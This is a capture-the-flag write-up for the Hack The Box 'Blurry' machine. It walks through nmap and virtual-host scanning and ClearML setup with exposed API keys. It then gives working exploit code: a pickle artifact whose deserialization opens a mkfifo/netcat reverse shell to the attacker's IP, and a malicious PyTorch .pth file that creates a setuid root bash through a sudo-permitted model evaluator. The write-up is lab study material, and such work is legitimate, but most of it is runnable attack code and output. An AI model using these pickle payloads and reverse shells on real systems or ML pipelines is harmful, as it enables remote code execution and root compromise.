#HacktheBox 

Starting with Nmap to check for open ports:

```bash
nmap -sT -Pn -p- --min-rate 10000 10.10.11.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 16:01 IST
Warning: 10.10.11.19 giving up on port because retransmission cap hit (10).
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 71.27% done; ETC: 16:02 (0:00:17 remaining)
Nmap scan report for 10.10.11.19
Host is up (0.15s latency).
Not shown: 34026 closed tcp ports (conn-refused), 31507 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 81.16 seconds
```

Now checking for UDP ports

```bash
sudo nmap -sU -Pn -p- --min-rate 10000 10.10.11.19
[sudo] password for mindflare: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 16:01 IST
Warning: 10.10.11.19 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.19
Host is up (0.27s latency).
All 65535 scanned ports on 10.10.11.19 are in ignored states.
Not shown: 65455 open|filtered udp ports (no-response), 80 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 76.64 seconds
```

Full scan report:

```bash
sudo nmap -sC -sV -p22,80 10.10.11.19 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 16:08 IST
Nmap scan report for 10.10.11.19
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.04 seconds
```

Doing vhost enum

```bash
ffuf -u http://10.10.11.19 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.blurry.htb" -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.19
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

api                     [Status: 400, Size: 280, Words: 4, Lines: 1, Duration: 160ms]
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 206ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 763ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 215ms
```

here I find 3 VHOST , add them into host file.

Checking http://chat.blurry.htb/channel/Announcements

![](images/Pasted%20image%2020240609183527.png)
From here i get the idea of what going on in the http://app.blurry.htb and how can i gain shell.

![](images/Pasted%20image%2020240610213715.png)

using above command i install clearml
and then from the website i get cred .

```bash
clearml-init                   
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "CTO6MJSB2KVDB9K54TKE"
    "secret_key" = "HTh6UDsv6oPk51zDYtxeaLCmPoCC0lRSzEJW2XV8LrdaKVrZn5"
  }
}
Detected credentials key="CTO6MJSB2KVDB9K54TKE" secret="HTh6***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/mindflare/clearml.conf
ClearML setup completed successfully.

```
Here then in my machine i create a python script , i will elaborate it:



```bash
import os
import pickle
from clearml import Task

class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.xx PORT >/tmp/f',))

command = RunCommand()
task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=['review'], output_uri=True)
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True)
```


This script creates a malicious object that will execute a reverse shell command when deserialized. It uses the `pickle` module to serialize the `RunCommand` object and uploads it as an artifact to a ClearML server. The reverse shell command sets up a connection back to the specified IP and port, providing remote access to the machine.

```python
python3 exploit.py  

ClearML Task: created new task id=ebf6ed5ad8c240e4908910d371bc6516
2024-06-10 21:28:54,746 - clearml.Task - INFO - No repository found, storing script code instead
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/ebf6ed5ad8c240e4908910d371bc6516/output/log
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring

```

In the listener shell:
```bash
nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.16.9] from blurry.htb [10.10.11.19] 41046
bash: cannot set terminal process group (207273): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ id
id
uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
```

after that i check for sudo -l:

```bash
jippity@blurry:/models$ sudo -l
sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth

```
The `sudo -l` command shows that the user `jippity` can run the `/usr/bin/evaluate_model` command as root without a password, specifically for files matching `/models/*.pth`.

* So we create a create_malicious_model.py
* then run this with python3
* then it generated a .pth file in the /models
* then run it with /usr/bin/evaluate_model /models/*.pth

create_malicious_model.py :
```python
import torch

import os

import pickle



class PickleRCE:

    def __reduce__(self):

        return (os.system, ('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash',))



class CustomModel(torch.nn.Module):

    def __init__(self):

        super(CustomModel, self).__init__()



    def forward(self, x):

        return x



# Instantiate the malicious model and save it using torch.save

model = CustomModel()

state = {'malicious': PickleRCE()}



with open('/models/malicious_model.pth', 'wb') as f:

    torch.save(state, f)



print("[+] Malicious model saved to /models/malicious_model.pth")
```

after that download it in the /tmp

```bash
jippity@blurry:/tmp$ wget http://10.10.16.9:8000/create_malicious_model.py
wget http://10.10.16.9:8000/create_malicious_model.py
--2024-06-10 12:01:48--  http://10.10.16.9:8000/create_malicious_model.py
Connecting to 10.10.16.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 581 [text/x-python]
Saving to: ‘create_malicious_model.py’

create_malicious_model.py    100%[==============================================>]     581  --.-KB/s    in 0s      

2024-06-10 12:01:49 (63.1 MB/s) - ‘create_malicious_model.py’ saved [581/581]
```

after that give executable permission:

```bash
jippity@blurry:/tmp$ ls
ls
create_malicious_model.py  systemd-private-d375f29a5f3c452d9675ffb96085234e-systemd-logind.service-92aOQg
f                          systemd-private-d375f29a5f3c452d9675ffb96085234e-systemd-timesyncd.service-clWQli
lps.sh                     vmware-root_294-860397889

jippity@blurry:/tmp$ chmod +x create_malicious_model.py

chmod +x create_malicious_model.py

```

after that run it :

```bash
jippity@blurry:/tmp$ python3 create_malicious_model.py
python3 create_malicious_model.py
[+] Malicious model saved to /models/malicious_model.pth
jippity@blurry:/tmp$ cd ..
cd ..
jippity@blurry:/$ cd /models
cd /models
jippity@blurry:/models$ ls
ls
demo_model.pth  evaluate_model.py  malicious_model.pth  __pycache__

```

After that simple run that .pth file : malicious_model.pth

```bash
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/malicious_model.pth
sudo /usr/bin/evaluate_model /models/malicious_model.pth
[+] Model /models/malicious_model.pth is considered safe. Processing...
root@blurry:/models# id
id
uid=0(root) gid=0(root) groups=0(root)

```

Here we can see we get root shell.
